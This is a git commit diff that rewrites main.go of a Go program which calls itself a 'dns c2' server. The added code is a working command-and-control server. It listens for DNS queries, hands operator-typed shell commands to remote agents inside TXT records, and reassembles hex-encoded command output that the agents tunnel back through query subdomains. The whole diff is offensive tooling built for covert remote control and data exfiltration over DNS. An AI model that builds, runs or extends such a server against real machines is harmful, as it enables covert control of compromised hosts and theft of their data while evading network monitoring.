daa03961ecc12c64d0ae0db81a8cf2cd06b9885b
Dimtiar Ganev <d.ganev@protonmail.ch>
2022-10-29 23:56:26 +0300

    Change structure

--- main.go
+++ main.go
@@ -1,7 +1,87 @@
 package main
 
-import "github.com/syrull/dnsc2-server/cmd"
+import (
+	"bufio"
+	"encoding/hex"
+	"fmt"
+	"os"
+	"strings"
+
+	"github.com/erdaltsksn/cui"
+	"github.com/miekg/dns"
+)
+
+var cmd string = ""
+var joinBuffer []string
+var outputBuffer string
+
+func resetState() {
+	cmd = ""
+	joinBuffer = nil
+}
 
 func main() {
-	cmd.Run()
+	fmt.Println("><((((> dns c2 by syl <))))><")
+	args := os.Args[1:]
+	server := &dns.Server{Addr: args[0], Net: "udp"}
+
+	go func() {
+		if err := server.ListenAndServe(); err != nil {
+			cui.Error("Failed to setup the server", err)
+		}
+		defer server.Listener.Close()
+	}()
+
+	for {
+		fmt.Print("\ndnsc2> ")
+		scanner := bufio.NewScanner(os.Stdin)
+		if scanner.Scan() {
+			cmd = scanner.Text()
+			if cmd == " " {
+				continue
+			}
+		}
+
+		dns.HandleFunc(".", AgentHandler)
+
+		// Wait for full reply
+		for cmd != "" {
+			if cmd == "" {
+				break
+			}
+		}
+
+		fmt.Println(outputBuffer)
+	}
+}
+
+func AgentHandler(w dns.ResponseWriter, req *dns.Msg) {
+	urlConstr := req.Question[0].Name
+	deconUrl := strings.Split(urlConstr, ".")
+
+	dnsMessage := new(dns.Msg)
+	dnsMessage.SetReply(req)
+	dnsMessage.Authoritative = true
+	defer w.WriteMsg(dnsMessage)
+
+	dnsMessage.Answer = append(dnsMessage.Answer, &dns.TXT{
+		Hdr: dns.RR_Header{
+			Name:  req.Question[0].Name,
+			Class: req.Question[0].Qclass,
+			Ttl:   0, Rrtype: dns.TypeTXT,
+		},
+		Txt: []string{cmd},
+	})
+
+	if deconUrl[0] != "0" {
+		currentCunk := strings.Split(deconUrl[0], "-")[0]
+		chunkLen := strings.Split(deconUrl[0], "-")[1]
+		joinBuffer = append(joinBuffer, string(deconUrl[2]))
+		if currentCunk == chunkLen {
+			joinResult := strings.Join(joinBuffer, "")
+			decodedOut, _ := hex.DecodeString(joinResult)
+			outputBuffer = string(decodedOut)
+			resetState()
+		}
+	}
 }
